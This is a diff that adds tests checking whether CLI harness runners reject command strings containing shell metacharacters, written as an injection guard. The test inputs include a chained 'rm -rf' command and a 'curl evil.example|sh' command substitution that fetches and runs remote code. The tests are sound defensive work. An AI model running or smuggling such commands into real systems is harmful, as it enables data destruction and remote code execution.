@@ -80,3 +80,36 @@ describe("CLI harness adapter graceful failure [R5.6]", () => {
     expect(result.exitCode).toBe(0);
   });
 });
+
+// ---------------------------------------------------------------------------
+// Audit P1-1 / P3-latent-A (2026-07-16): harness command-injection guard.
+// These harnesses splice targetCommand into bash -c / sh -c. Although the CLI
+// harness is currently dead code (runCliHarness has no production wiring),
+// guard now so re-wiring can't activate a latent injection surface (SR-2).
+// ---------------------------------------------------------------------------
+
+describe("audit: tmux/pty harness reject shell-metachar commands (injection guard)", () => {
+  it("runTmuxHarness refuses a targetCommand with shell operators", async () => {
+    const { runTmuxHarness } = await import("../src/harness-tmux.js");
+    const result = await runTmuxHarness({
+      targetCommand: "echo hi; rm -rf /nonexistent-probe",
+    });
+    expect(result.ok).toBe(false);
+    expect(result.reason).toMatch(/meta|inject|shell|unsafe|reject/i);
+  });
+
+  it("runPtyHarness refuses a targetCommand with command substitution", async () => {
+    const { runPtyHarness } = await import("../src/harness-pty.js");
+    const result = await runPtyHarness({
+      targetCommand: "echo $(curl evil.example|sh)",
+    });
+    expect(result.ok).toBe(false);
+    expect(result.reason).toMatch(/meta|inject|shell|unsafe|reject/i);
+  });
+
+  it("runPtyHarness still accepts a simple command without metacharacters", async () => {
+    const { runPtyHarness } = await import("../src/harness-pty.js");
+    const result = await runPtyHarness({ targetCommand: "echo safe-command" });
+    expect(result.ok).toBe(true);
+  });
+});
